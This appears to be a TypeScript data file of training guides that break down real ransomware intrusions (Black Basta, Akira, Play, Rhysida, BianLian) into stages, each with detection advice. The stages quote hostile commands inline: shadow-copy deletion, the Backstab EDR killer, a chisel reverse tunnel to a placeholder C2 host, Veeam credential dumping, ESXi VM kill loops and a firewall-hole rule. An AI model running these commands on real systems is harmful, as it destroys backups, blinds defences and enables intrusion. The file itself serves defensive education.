import { ScenarioStepGuide } from '../scenario-step-guides';

export const BATCH9_RANSOMWARE_EXTORTION_STEP_GUIDES: Record<string, ScenarioStepGuide> = {
  'blackbasta-qakbot-backstab-ransomware': {
    scenarioId: 'blackbasta-qakbot-backstab-ransomware',
    briefing: {
      headline:
        'Black Basta affiliates (Storm-1811) flood victim inboxes with spam before calling via Microsoft Teams impersonating IT Help Desk to coerce Windows Quick Assist execution, deploy Backstab (PROCEXP.SYS BYOVD) to blind EDR, and detonate ChaCha20 encryption (.basta).',
      storyAnalogy:
        'Imagine an extortion crew dumps 2,000 junk mail catalogs through an employee’s mail slot in five minutes. While the employee is overwhelmed, the crew rings the internal office video intercom wearing an "IT Help Desk" badge, says "We see your mailbox is glitching—press Ctrl+Win+Q so we can fix it," and tricks the employee into opening the side service door (`QuickAssist.exe`), through which they blind the guards (`Backstab`) and lock the building.',
      plainSummary:
        'Documented in joint CISA/FBI/HHS Advisory AA24-131A and Microsoft Threat Intelligence reports on Storm-1811, Black Basta affiliates shifted from QakBot email malspam to human-operated Microsoft Teams vishing. After flooding a target’s email inbox, the attacker contacts them over external Microsoft Teams chat/voice posing as IT support, convinces them to launch the built-in Windows `QuickAssist.exe` utility, deploys the `Backstab` BYOVD tool (`PROCEXP.SYS`) to strip EDR handles, exfiltrates data with `rclone`, and encrypts network shares with ChaCha20/RSA-4096 (`.basta`).',
      diagramTopologySummary:
        'Storm-1811 / Black Basta Operator -> Microsoft Teams External Federation -> Workstation (QuickAssist.exe Session) -> Enterprise Shares (.basta ChaCha20) -> CISA AA24-131A / Defender XDR Sensor.',
      documentedAdvisory:
        'CISA / FBI / HHS Joint Advisory AA24-131A (#StopRansomware: Black Basta) / Microsoft Storm-1811 Analysis / Trend Micro Report',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse',
        technicalTitle: 'Stage 1: Email Bombing, External Microsoft Teams Vishing & QuickAssist.exe Abuse',
        mitreTactic: 'Initial Access (T1566.004 - Spearphishing Voice / T1219 - Remote Access Software)',
        storyAnalogy:
          'First the scammer jams the victim’s mailbox with thousands of magazines to create panic, then calls on the internal intercom pretending to be the mailroom technician offering to clean it up.',
        simpleExplanation:
          'Storm-1811 bombarded the target’s corporate email address with thousands of automated newsletter registrations (creating both distraction and a believable pretext for an urgent IT call, while burying real security alert emails in the flood), then initiated an external federated Microsoft Teams call impersonating `"IT Help Desk"` and instructed the user to launch `C:\\Windows\\System32\\QuickAssist.exe` (a pre-installed, Microsoft-signed remote support binary that establishes an encrypted outbound screen-sharing and remote-control session via `*.remoteassistance.support.services.microsoft.com`).',
        howItWorksInPractice:
          'Because `QuickAssist.exe` is natively included in Windows 10/11 and communicates exclusively with legitimate `*.microsoft.com` relay servers over HTTPS, standard perimeter firewalls and web proxies allow the session by default.',
        diagramAlignment:
          'Vector #1.1 links the Storm-1811 Operator through Microsoft Teams External Federation to the Workstation (`QuickAssist.exe Session`).',
        detectionAndEvidence:
          'Correlating high-volume inbound SMTP spam spikes with external Microsoft Teams calls and Sysmon EventID 1 execution of `QuickAssist.exe`.',
      },
      {
        stepNumber: 2,
        plainTitle: 'Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging',
        technicalTitle: 'Stage 2: Backstab EDR Handle Killer & SoftPerfect / Rclone Lateral Staging',
        mitreTactic: 'Defense Evasion & Discovery (T1562.001 / T1046)',
        storyAnalogy:
          'Once inside via the remote-support screen, the intruder runs a tool that pries open the fingers of the security guards so they drop their weapons, maps the floorplan, and bags up the files.',
        simpleExplanation:
          'Inside the `QuickAssist.exe` session, the operator used `curl.exe` or `msiexec.exe` to stage payloads, executed `Backstab` (`backstab.exe -n MsMpEng.exe -k`, an open-source BYOVD utility that loads the signed Sysinternals `PROCEXP.SYS` driver to enumerate and forcibly close every kernel object and file handle held by Protected Process Light EDR agents), scanned internal subnets with SoftPerfect Network Scanner (`netscan.exe`), and exfiltrated sensitive shares using `rclone.exe`.',
        howItWorksInPractice:
          'Closing all kernel handles held by an EDR process via `Backstab` renders the security sensor deaf and unable to inspect files or processes even if the main user-mode `.exe` appears running in Task Manager.',
        diagramAlignment:
          'Vector #2.1 connects the Workstation (`QuickAssist.exe`) to the CISA AA24-131A / Defender XDR Sensor as `Backstab` and `netscan.exe` execute.',
        detectionAndEvidence:
          'Sysmon EventID 1 & 6 alerting on `QuickAssist.exe` spawning `cmd.exe`/`powershell.exe`/`msiexec.exe` and `backstab.exe` loading `PROCEXP.SYS`.',
      },
      {
        stepNumber: 3,
        plainTitle: 'vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)',
        technicalTitle: 'Stage 3: vssadmin Shadow Wipe & Black Basta ChaCha20/RSA-4096 Encryption (.basta)',
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1490)',
        storyAnalogy:
          'After deleting the building’s backup snapshots, the encryptor races through every shared folder, scrambling 64 bytes out of every 192 bytes so files are ruined in seconds.',
        simpleExplanation:
          'Pivoting across the domain with `PsExec` or `WMI`, the operator ran `vssadmin.exe delete shadows /all /quiet` to destroy Volume Shadow Copies and executed the C++ Black Basta encryptor (`basta.exe -forcepath`, which uses a multi-threaded `XChaCha20` stream cipher to encrypt 64-byte blocks alternating with 128-byte unencrypted gaps for maximum throughput, protects the per-file key with `RSA-4096`, appends `.basta`, and drops `readme.faa.txt`).',
        howItWorksInPractice:
          'By encrypting 64 bytes and skipping 128 bytes across large files, Black Basta corrupts multi-terabyte file servers in minutes before administrators can pull network cables.',
        diagramAlignment:
          'Vector #3.1 traces the Workstation deploying `basta.exe` across Enterprise Shares (`.basta ChaCha20`).',
        detectionAndEvidence:
          'EDR behavioral blocking of `vssadmin.exe delete shadows` and detection of `.basta` file renames and `readme.faa.txt` ransom note creation.',
      },
    ],
  },
  'akira-ransomware-cisco-anyconnect-esxi': {
    scenarioId: 'akira-ransomware-cisco-anyconnect-esxi',
    briefing: {
      headline:
        'Akira ransomware affiliates breach Cisco ASA/FTD AnyConnect VPN appliances (CVE-2023-20269 / CVE-2020-3259), tunnel via Chisel, dump Veeam backup credentials, run esxcli vm process kill on VMware ESXi hypervisors, and deploy the Rust Akira ESXi encryptor (AA24-109A).',
      storyAnalogy:
        'Imagine a heist crew slips through an old side gate (`DefaultWEBVPNGroup`) on the perimeter wall that forgot to ask for a second ID factor, digs an underground tunnel (`Chisel`), steals the master key ring from the backup vault (`Veeam SQL DB`), walks straight into the power plant running all the virtual offices (`VMware ESXi`), flips the main breaker on every running virtual office (`esxcli vm process kill`), and padlocks their hard drives.',
      plainSummary:
        'Tracked in joint CISA/FBI/Europol Advisory AA24-109A and Sophos X-Ops research, Akira ransomware affiliates frequently breach enterprises via Cisco ASA/FTD AnyConnect SSL VPNs (exploiting CVE-2023-20269 or CVE-2020-3259 to compromise single-factor VPN accounts). Once inside, they establish a reverse SOCKS5 proxy with `chisel.exe`, extract privileged credentials from Veeam Backup & Replication SQL databases, SSH into VMware ESXi hypervisors, forcefully kill running VMs via `esxcli vm process kill`, and execute their Rust/C++ Linux encryptor (`akira_esxi`) against `/vmfs/volumes`.',
      diagramTopologySummary:
        'Akira Affiliate Operator -> Cisco ASA / AnyConnect VPN Appliance -> Windows Jump Host (Chisel & Mimikatz) -> VMware ESXi Host (esxcli + Rust Akira) -> CISA AA24-109A / Sophos MDR Sensor.',
      documentedAdvisory:
        'CISA / FBI / Europol Joint Advisory AA24-109A (#StopRansomware: Akira) / Cisco CVE-2023-20269 / Sophos X-Ops Akira Report',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)',
        technicalTitle: 'Stage 1: Cisco ASA / AnyConnect Single-Factor VPN Breach (CVE-2023-20269 / CVE-2020-3259)',
        mitreTactic: 'Initial Access (T1133 - External Remote Services / T1190)',
        storyAnalogy:
          'Even if the main employee VPN entrance requires a smartphone push code, the firewall still has a hidden default entrance (`DefaultWEBVPNGroup`) that accepts a password alone.',
        simpleExplanation:
          'Akira affiliates targeted WAN-facing Cisco ASA and Firepower Threat Defense (`FTD`) appliances, exploiting `CVE-2020-3259` (an unauthenticated memory disclosure vulnerability that leaks active session tokens and credentials from ASA memory) or `CVE-2023-20269` (an authorization bypass allowing brute-force and password-spray authentication against the built-in `DefaultWEBVPNGroup` connection profile without triggering MFA), establishing an encrypted AnyConnect VPN session.',
        howItWorksInPractice:
          'Many administrators configured Duo/Azure MFA on their custom VPN tunnel group (`Corp-MFA-Tunnel`) but left the built-in `DefaultWEBVPNGroup` or `DefaultRAGroup` active with local/LDAP password-only authentication.',
        diagramAlignment:
          'Vector #1.1 links the Akira Affiliate Operator to the Cisco ASA / AnyConnect VPN Appliance over TCP/UDP 443.',
        detectionAndEvidence:
          'Cisco ASA syslog `%ASA-6-722022` and `%ASA-6-113004` events showing logins to `DefaultWEBVPNGroup` or `DefaultRAGroup` from external hosting ASNs.',
      },
      {
        stepNumber: 2,
        plainTitle: 'Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi',
        technicalTitle: 'Stage 2: Chisel SOCKS Tunneling, Veeam Credential Dumping & SSH Pivot to ESXi',
        mitreTactic: 'Credential Access & Command and Control (T1555 / T1572)',
        storyAnalogy:
          'Landing on a Windows server, the attacker sets up a hidden proxy pipe and raids the backup server’s database, which conveniently holds the root password to the VMware hypervisors.',
        simpleExplanation:
          'Pivoting to an internal Windows server, the operator launched `chisel.exe client https://<c2>:8443 R:socks` (establishing a fast TCP-over-HTTP/WebSocket reverse SOCKS5 tunnel) and queried the local `VeeamBackup` Microsoft SQL database (`SELECT user_name, password FROM [VeeamBackup].[dbo].[Credentials]`, decrypting the DPAPI-protected blobs to recover the cleartext `root` SSH credentials and vCenter service accounts used by Veeam to snapshot VMware ESXi hosts).',
        howItWorksInPractice:
          'Because backup servers require high-privilege access to every hypervisor and domain controller to perform backups, compromising the Veeam database gives the attacker immediate Tier-0 hypervisor credentials.',
        diagramAlignment:
          'Vector #2.1 connects the Cisco ASA VPN to the Windows Jump Host (`Chisel & Mimikatz`) and triggers the CISA AA24-109A / Sophos MDR Sensor.',
        detectionAndEvidence:
          'Sysmon EventID 1 for `chisel.exe` or `sqlcmd.exe` querying `[VeeamBackup].[dbo].[Credentials]` and DPAPI `CryptUnprotectData` calls on the Veeam server.',
      },
      {
        stepNumber: 3,
        plainTitle: 'esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption',
        technicalTitle: 'Stage 3: esxcli vm process kill & Rust-Based Akira ESXi Hypervisor Encryption',
        mitreTactic: 'Impact (T1489 - Service Stop / T1486 - Data Encrypted for Impact)',
        storyAnalogy:
          'Instead of breaking into 100 individual virtual servers, the attacker logs into the single physical host running all 100 of them, yanks their power cords (`esxcli vm process kill`), and encrypts their virtual hard drive files.',
        simpleExplanation:
          'Using the stolen ESXi credentials over SSH, the operator executed a shell loop invoking `esxcli vm process list` and `esxcli vm process kill --type=force --world-id=<id>` (forcefully terminating every running `vmx` virtual machine hypervisor process so the ESXi kernel releases its exclusive file locks on `.vmdk` and `.vswp` virtual disk files) and launched the Rust-compiled Akira ELF encryptor (`/tmp/akira_esxi -p /vmfs/volumes --fork`, encrypting all datastore volumes with ChaCha20/RSA-4096).',
        howItWorksInPractice:
          'Because most enterprises do not install EDR agents directly inside the proprietary VMware ESXi `VMkernel` OS, encrypting from the hypervisor shell bypasses all guest-OS Windows/Linux EDR agents installed inside the VMs.',
        diagramAlignment:
          'Vector #3.1 traces the SSH pivot from the Windows Jump Host to the VMware ESXi Host (`esxcli + Rust Akira`).',
        detectionAndEvidence:
          'Forwarding ESXi `/var/log/shell.log` and `/var/log/hostd.log` to a SIEM to alert immediately on `esxcli vm process kill` and unauthorized ELF execution from `/tmp`.',
      },
    ],
  },
  'play-ransomware-grixba-vss-copy': {
    scenarioId: 'play-ransomware-grixba-vss-copy',
    briefing: {
      headline:
        'Play (Playcrypt) ransomware operators deploy their custom Grixba .NET reconnaissance scanner (inf_g.exe), abuse the AlphaVSS .NET library to exfiltrate locked files directly from Volume Shadow Copies via COM without invoking vssadmin.exe, and execute 1MB-stride intermittent encryption (.play, AA23-352A).',
      storyAnalogy:
        'Imagine a burglar who knows that shouting "Make a shadow copy!" (`vssadmin.exe`) will trip the voice-activated alarm in the vault. So instead, the burglar brings a silent mechanical arm (`AlphaVSS .NET COM Library`) that quietly reaches into the shadow vault without making a sound, pulls out the locked master ledger (`ntds.dit` and SQL databases), smashes the shadow vault behind them, and then scrambles every fifth page of the remaining books.',
      plainSummary:
        'Detailed in joint CISA/FBI/ASD Advisory AA23-352A and Symantec Threat Hunter research, Play ransomware operators rely on two signature custom tools: `Grixba` (`inf_g.exe`, a `.NET` network and security-software enumerator packed with `Costura.Fody` and disguised with a SentinelOne icon) and a custom `.NET` `VSS Copying Tool` built on the `AlphaVSS` library (`AlphaVSS.x64.dll`). By calling the `IVssBackupComponents` COM interface directly via `AlphaVSS`, they snapshot and copy locked databases (`ntds.dit`, `.mdf`) and delete shadow copies without ever spawning `vssadmin.exe` or `wmic.exe`, before running 1MB-stride intermittent encryption (`.play`).',
      diagramTopologySummary:
        'Play Ransomware Operator -> Compromised RDP / FortiOS / Exchange -> Grixba .NET Scanner (inf_g.exe) -> AlphaVSS Shadow Access & .play Shares -> CISA AA23-352A / Symantec EDR Sensor.',
      documentedAdvisory:
        'CISA / FBI / ASD Joint Advisory AA23-352A (#StopRansomware: Play Ransomware) / Symantec Grixba & AlphaVSS Analysis',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'Deploying Custom Grixba .NET Reconnaissance Scanner (inf_g.exe)',
        technicalTitle: 'Stage 1: Deploying Custom Grixba .NET Reconnaissance Scanner (inf_g.exe)',
        mitreTactic: 'Discovery & Collection (T1046 / T1560.001)',
        storyAnalogy:
          'Dressed in a fake security guard vest (`SentinelOne Icon`), an automated scout walks every hallway in the building and writes down which rooms have alarms and where the safes are kept.',
        simpleExplanation:
          'Play operators staged `C:\\Users\\Public\\Music\\inf_g.exe` (`Grixba`, a custom `.NET` reconnaissance tool compiled with `Costura.Fody` to embed its DLL dependencies inside a single executable and stamped with a forged `SentinelOne` icon and file description) and ran `inf_g.exe -m:all -d:corp.local` (enumerating all Active Directory computers, WMI `AntivirusProduct` statuses, backup software, and active user sessions into a SQLite database compressed as `ExportData.zip`).',
        howItWorksInPractice:
          'Staging tools specifically inside `C:\\Users\\Public\\Music\\` is a consistent operational tradecraft hallmark of Play ransomware intrusions.',
        diagramAlignment:
          'Vector #1.1 links the Play Ransomware Operator through the Compromised Perimeter to the Grixba `.NET` Scanner (`inf_g.exe`).',
        detectionAndEvidence:
          'Sysmon EventID 1 & 7 detecting unsigned `.NET` binaries in `C:\\Users\\Public\\Music\\` loading `Costura` assemblies and passing `-m:all` or `-m:s` command-line flags.',
      },
      {
        stepNumber: 2,
        plainTitle: 'AlphaVSS .NET Shadow Copy Mounting for Locked Database Exfiltration',
        technicalTitle: 'Stage 2: AlphaVSS .NET Shadow Copy Mounting for Locked Database Exfiltration',
        mitreTactic: 'Collection & Defense Evasion (T1006 - Direct Volume Access / T1490)',
        storyAnalogy:
          'Instead of using the noisy public command-line tool (`vssadmin.exe`) that every security camera watches, the thief uses a direct programming interface (`AlphaVSS`) to quietly clone and steal locked files.',
        simpleExplanation:
          'To steal files locked exclusively by the OS (such as `C:\\Windows\\NTDS\\ntds.dit` or live SQL Server `.mdf` files) and subsequently wipe recovery snapshots without triggering command-line EDR rules for `vssadmin.exe` or `wmic.exe`, Play deployed a custom `.NET` utility loading `AlphaVSS.x64.dll` and `AlphaFS.dll` (which wrap the native Windows `IVssBackupComponents` COM API to create a Volume Shadow Copy, copy locked files directly from `\\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy*`, and delete all shadow copies programmatically).',
        howItWorksInPractice:
          'Because `vssadmin.exe`, `wmic.exe`, and `powershell.exe` are never spawned during this step, detection rules that rely purely on process command-line strings completely miss both the `ntds.dit` theft and the shadow copy deletion.',
        diagramAlignment:
          'Vector #2.1 connects the Grixba Scanner host to the AlphaVSS Shadow Access node while the CISA AA23-352A / Symantec EDR Sensor observes the `AlphaVSS.x64.dll` load.',
        detectionAndEvidence:
          'Sysmon EventID 7 (`ImageLoaded`) for `AlphaVSS.x64.dll` / `AlphaFS.dll` and Windows `VSSEvent` log monitoring for non-standard processes invoking `IVssBackupComponents`.',
      },
      {
        stepNumber: 3,
        plainTitle: 'WinPE APIUnhooking & Intermittent 0x100000-Byte Chunk Encryption (.play)',
        technicalTitle: 'Stage 3: WinPE APIUnhooking & Intermittent 0x100000-Byte Chunk Encryption (.play)',
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact)',
        storyAnalogy:
          'To lock huge files before anyone can react, the encryptor only scrambles two or three 1-megabyte slices out of each giant file and stamps `deadbeef` at the bottom.',
        simpleExplanation:
          'Pushed via Group Policy Objects (`GPO`), the Play ransomware binary dynamically resolved APIs via the Process Environment Block (`PEB`) to evade user-mode hooks, checked if target files already contained the `0xdeadbeef` footer marker, and performed `intermittent encryption` (encrypting only 2, 3, or 5 specific `0x100000`-byte / `1MB` chunks per file depending on total file size using `AES` and `RSA-4096`, appending `.play`, and dropping a minimalist `ReadMe.txt` containing only the word `"PLAY"` and an email address).',
        howItWorksInPractice:
          'Encrypting only a few 1MB chunks per multi-gigabyte file reduces disk I/O by over 95%, allowing Play to corrupt terabytes of storage in minutes while keeping average file-entropy scores low enough to fool naive entropy-based ransomware detectors.',
        diagramAlignment:
          'Vector #3.1 traces the AlphaVSS Shadow Access node into the `.play` Shares intermittent encryption phase.',
        detectionAndEvidence:
          'Minifilter behavioral detection of `0x100000`-stride partial file overwrites, `.play` extension renames, and `0xdeadbeef` file footers.',
      },
    ],
  },
  'rhysida-ransomware-zerologon-ps-silentskill': {
    scenarioId: 'rhysida-ransomware-zerologon-ps-silentskill',
    briefing: {
      headline:
        'Rhysida ransomware operators (Vice Society nexus) deploy the PortStarter Golang firewall backdoor, execute the SilentKill PowerShell script (g.ps1) to stop 200+ AV/backup services, and run the LibTomCrypt-based Rhysida encryptor (AES-256-CTR + RSA-4096, AA23-319A).',
      storyAnalogy:
        'Imagine a burglary crew that first props open a secret window in the building’s outer wall (`PortStarter`), then sends in an advance demolition script (`SilentKill / g.ps1`) that runs down a checklist of 214 security guards, database clerks, and backup systems—knocking every single one unconscious and unlocking all the interior doors (`RestrictedAdmin RDP`)—before the main vault-locking team (`Rhysida`) marches through.',
      plainSummary:
        'Covered in joint CISA/FBI/MS-ISAC Advisory AA23-319A and Sekoia/Cisco Talos intelligence reports linking Rhysida to Vice Society (DEV-0832), Rhysida intrusions follow a disciplined three-phase playbook: (1) deploying `PortStarter` (a Golang backdoor that adds an inbound Windows Firewall rule via `netsh` for mTLS C2), (2) executing `SilentKill` (`g.ps1`, a PowerShell script that unhooks AMSI, stops 200+ AV/SQL/backup services, and enables RestrictedAdmin RDP), and (3) pushing `rhysida.exe` via PsExec to encrypt files using `LibTomCrypt` `AES-256-CTR` and `RSA-4096` (`.rhysida` + `CriticalBreachDetected.pdf`).',
      diagramTopologySummary:
        'Rhysida Affiliate (Vice Society Nexus) -> PortStarter Go Backdoor (Firewall Rule) -> SilentKill PowerShell Script (g.ps1) -> LibTomCrypt AES-256-CTR (.rhysida) -> CISA AA23-319A / Sekoia XDR Sensor.',
      documentedAdvisory:
        'CISA / FBI / MS-ISAC Joint Advisory AA23-319A (#StopRansomware: Rhysida) / Sekoia & Trend Micro SilentKill / PortStarter Analysis',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'PortStarter Golang Backdoor & Windows Firewall Rule Tampering',
        technicalTitle: 'Stage 1: PortStarter Golang Backdoor & Windows Firewall Rule Tampering',
        mitreTactic: 'Persistence & Defense Evasion (T1562.004 - Disable or Modify System Firewall)',
        storyAnalogy:
          'The intruder installs a disguised service that punches a custom hole in the Windows Firewall so their command server can connect directly into a high port.',
        simpleExplanation:
          'After initial VPN or credential access, the operator installed `PortStarter` (a custom Golang backdoor shared between Vice Society and Rhysida affiliates that registers itself as a Windows service and executes `netsh advfirewall firewall add rule name="Windows Update Service" dir=in action=allow protocol=TCP localport=49155` to punch an inbound hole in the host firewall for encrypted C2 communication).',
        howItWorksInPractice:
          'The shared use of `PortStarter` and `SilentKill` provided high-confidence forensic proof that Vice Society (`DEV-0832`) operators transitioned directly to the Rhysida ransomware payload in mid-2023.',
        diagramAlignment:
          'Vector #1.1 links the Rhysida Affiliate to the `PortStarter` Go Backdoor (`Firewall Rule`) on the compromised host.',
        detectionAndEvidence:
          'Sysmon EventID 1 for `netsh.exe advfirewall firewall add rule` spawned by unsigned Golang binaries in `C:\\ProgramData` and Windows Firewall EventID 2004.',
      },
      {
        stepNumber: 2,
        plainTitle: 'SilentKill PowerShell Script (g.ps1) Disabling 200+ Services & Unhooking AMSI',
        technicalTitle: 'Stage 2: SilentKill PowerShell Script (g.ps1) Disabling 200+ Services & Unhooking AMSI',
        mitreTactic: 'Defense Evasion & Service Stop (T1562.001 / T1489)',
        storyAnalogy:
          'A single master PowerShell script blinds the script scanner, shuts down over 200 security and database services so no files are locked, and flips on pass-the-hash RDP.',
        simpleExplanation:
          'To prepare the environment for unobstructed encryption, the operator ran `SilentKill` (`g.ps1`), which first patched `AmsiScanBuffer` in `amsi.dll` memory, iterated through a hardcoded list of over 200 Windows services (`Stop-Service -Force` targeting Sophos, Symantec, Veeam, SQL Server, Exchange, and shadow copies so database files were unlocked for encryption), and set `HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DisableRestrictedAdmin = 0` (enabling `RestrictedAdmin` RDP mode so the attacker could log into downstream servers via RDP using NTLM password hashes without cleartext passwords).',
        howItWorksInPractice:
          'Enabling `DisableRestrictedAdmin = 0` across the domain allows the operator to Pass-the-Hash over RDP (`mstsc.exe /restrictedadmin`) without exposing their own cleartext credentials on target hosts.',
        diagramAlignment:
          'Vector #2.1 connects the `PortStarter` host to the `SilentKill` PowerShell Script (`g.ps1`) and triggers the CISA AA23-319A / Sekoia XDR Sensor.',
        detectionAndEvidence:
          'PowerShell EventID 4104 capturing `SilentKill` service-termination loops and Registry EventID 13 modifications to `Lsa\\DisableRestrictedAdmin`.',
      },
      {
        stepNumber: 3,
        plainTitle: 'Multi-Threaded LibTomCrypt AES-256-CTR Encryption & Desktop Wallpaper Lock (.rhysida)',
        technicalTitle: 'Stage 3: Multi-Threaded LibTomCrypt AES-256-CTR Encryption & Desktop Wallpaper Lock (.rhysida)',
        mitreTactic: 'Impact (T1486 - Data Encrypted for Impact / T1491.001 - Internal Defacement)',
        storyAnalogy:
          'Using PsExec to launch simultaneously on every machine, the encryptor scrambles files with military-grade AES-256-CTR, drops a PDF ransom note, and replaces every employee’s desktop wallpaper.',
        simpleExplanation:
          'Pushed domain-wide via `psexec.exe -d -s`, the 64-bit MinGW-compiled `rhysida.exe` binary invoked its statically linked `LibTomCrypt v1.18.2` cryptographic library (`aes_setup` and `ctr_start` in `AES-256-CTR` mode paired with a hardcoded 4096-bit `RSA` public key) to encrypt files across all local drives, appending `.rhysida`, writing a PDF ransom note (`CriticalBreachDetected.pdf`), and modifying `HKCU\\Control Panel\\Desktop\\Wallpaper` to display an extortion warning.',
        howItWorksInPractice:
          'Unlike most ransomware families that drop `.txt` or `.hta` ransom notes, Rhysida generates a standalone `.pdf` document (`CriticalBreachDetected.pdf`) in every encrypted directory.',
        diagramAlignment:
          'Vector #3.1 traces `SilentKill` handing off to the `LibTomCrypt AES-256-CTR (.rhysida)` encryption stage across the enterprise.',
        detectionAndEvidence:
          'YARA rules matching `LibTomCrypt` constants in MinGW PE binaries, creation of `CriticalBreachDetected.pdf`, and `.rhysida` file extensions.',
      },
    ],
  },
  'bianlian-extortion-go-backdoor-rdp': {
    scenarioId: 'bianlian-extortion-go-backdoor-rdp',
    briefing: {
      headline:
        'BianLian operators abandon file encryption in favor of pure data-exfiltration extortion (AA23-136A), deploying a custom Golang mTLS backdoor with an embedded yamux/go-socks5 proxy and exfiltrating terabytes of data via renamed rclone binaries.',
      storyAnalogy:
        'Imagine a modern heist crew that realizes blowing up the bank vault (`ransomware encryption`) sets off every alarm in the city and forces the bank to rebuild from backups anyway. Instead, they slip in quietly, install a single custom-built periscope (`Golang mTLS + SOCKS5 Backdoor`) that lets them peer into every room from across the ocean, photocopy every confidential legal and financial contract (`rclone`), and leave a quiet note on the CEO’s desk without touching a single lock.',
      plainSummary:
        'Documented in joint CISA/FBI/ASD Advisory AA23-136A and Red Canary / Avast research, BianLian shifted by 2023–2024 to a pure data-exfiltration extortion model—skipping file encryption entirely. Upon breaching an environment via RDP or edge vulnerabilities, BianLian deploys a per-victim compiled Golang backdoor that establishes a mutual TLS (mTLS) session multiplexed with `hashicorp/yamux` and an internal `armon/go-socks5` proxy, enumerates shares with `SharpShares`, and exfiltrates sensitive data to Mega.io or FTP servers using a renamed `rclone.exe` binary (`Win.exe`).',
      diagramTopologySummary:
        'BianLian Extortion C2 & Mega/FTP Drop -> Golang mTLS Backdoor (Windows/Linux) -> Embedded go-socks5 Memory Proxy -> Pure Exfiltration (rclone / SharpShares) -> CISA AA23-136A / Red Canary Sensor.',
      documentedAdvisory:
        'CISA / FBI / ASD Joint Advisory AA23-136A (#StopRansomware: BianLian) / Red Canary & Avast BianLian Golang Analysis',
    },
    steps: [
      {
        stepNumber: 1,
        plainTitle: 'Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning',
        technicalTitle: 'Stage 1: Deploying Custom Golang mTLS Backdoor with Hardcoded X.509 Pinning',
        mitreTactic: 'Command and Control (T1573.002 - Asymmetric Cryptography / mTLS)',
        storyAnalogy:
          'For each target company, the attacker compiles a fresh, one-of-a-kind Go program that only talks to a single hardcoded IP address using a pair of matching digital passports (`mTLS`).',
        simpleExplanation:
          'After initial entry, BianLian dropped a uniquely compiled 64-bit Golang executable (masquerading under Windows system filenames like `SystemSettingsAdminFlows.exe` or `Win64Ark.exe`) that initiated an outbound `mutual TLS (mTLS)` connection directly to a hardcoded C2 IP address (embedding both the client X.509 certificate/private key and the expected C2 server certificate inside the Go binary so network middleboxes and security scanners could not intercept or probe the C2 server).',
        howItWorksInPractice:
          'Because the C2 IP and X.509 certificates are compiled directly into each binary right before deployment, every victim receives a distinct file hash.',
        diagramAlignment:
          'Vector #1.1 links the BianLian Extortion C2 to the Golang mTLS Backdoor (`Windows/Linux`) over TCP port 443.',
        detectionAndEvidence:
          'Sysmon EventID 1 & 3 identifying unsigned Golang binaries in `C:\\Windows\\Temp` or `C:\\ProgramData` containing Go symbols `main.backconnect`, `hashicorp/yamux`, and `armon/go-socks5`.',
      },
      {
        stepNumber: 2,
        plainTitle: 'In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot',
        technicalTitle: 'Stage 2: In-Memory Yamux Multiplexing & Built-In go-socks5 Lateral Pivot',
        mitreTactic: 'Command and Control (T1090.001 - Internal Proxy / SOCKS5)',
        storyAnalogy:
          'Rather than installing malware on twenty different servers, the single Go program turns itself into an invisible switchboard (`go-socks5`), letting the attacker browse the whole network from the outside.',
        simpleExplanation:
          'Once the mTLS socket connected, the Golang backdoor wrapped the TLS stream in a `HashiCorp Yamux` connection multiplexer (`github.com/hashicorp/yamux`) and attached an in-memory `SOCKS5` server (`github.com/armon/go-socks5`, allowing the external operator to route `Impacket`, `SharpShares`, LDAP queries, and SMB file reads through the single compromised host without dropping secondary implants onto target file servers).',
        howItWorksInPractice:
          'By centralizing C2 and proxying inside a single lightweight Go binary that contains zero exploit code or encryption routines, BianLian minimizes its endpoint footprint across the domain.',
        diagramAlignment:
          'Vector #2.1 connects the Golang mTLS Backdoor to the Embedded `go-socks5` Memory Proxy and triggers the CISA AA23-136A / Red Canary Sensor.',
        detectionAndEvidence:
          'Network and EDR telemetry showing a single non-DC host initiating rapid fan-out SMB (`445`) and LDAP (`389`) connections while maintaining a persistent external TLS stream.',
      },
      {
        stepNumber: 3,
        plainTitle: 'Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)',
        technicalTitle: 'Stage 3: Pure Data-Exfiltration Extortion via Rclone & FTP (Zero Encryption)',
        mitreTactic: 'Exfiltration (T1567.002 - Exfiltration to Cloud Storage / T1048)',
        storyAnalogy:
          'Instead of locking the files—which would trip ransomware alarms—the thief disguises a cloud-sync tool as `Win.exe`, copies the crown jewels to Mega.io, and leaves a ransom note.',
        simpleExplanation:
          'Skipping file encryption completely (thereby evading all EDR behavioral ransomware sensors that watch for mass file-rename or high-entropy overwrite loops), BianLian staged a renamed copy of `rclone.exe` (e.g., `C:\\ProgramData\\Win.exe`) or `FileZilla` to stream sensitive intellectual property, financial records, and PII to `Mega.io` cloud storage or attacker FTP servers, leaving behind `Look_at_this_file.txt` demanding payment to prevent public disclosure.',
        howItWorksInPractice:
          'Even when `rclone.exe` is renamed to `Win.exe` or `svchost.exe`, its PE version-info header (`OriginalFileName: rclone.exe`) and Go symbol table remain intact and detectable by YARA/Sysmon.',
        diagramAlignment:
          'Vector #3.1 traces the `go-socks5` proxy and `SharpShares` discovery into Pure Exfiltration (`rclone / SharpShares`) out to the BianLian Mega/FTP Drop.',
        detectionAndEvidence:
          'Sysmon EventID 1 matching `OriginalFileName=rclone.exe` or command-line flags (`copy`, `--bwlimit`, `mega:`) and egress firewall blocks on `*.mega.co.nz`.',
      },
    ],
  },
  'hermeticwiper-ukraine-easeus-mbr-wipe': {
    scenarioId: 'hermeticwiper-ukraine-easeus-mbr-wipe',
    briefing: {
      headline:
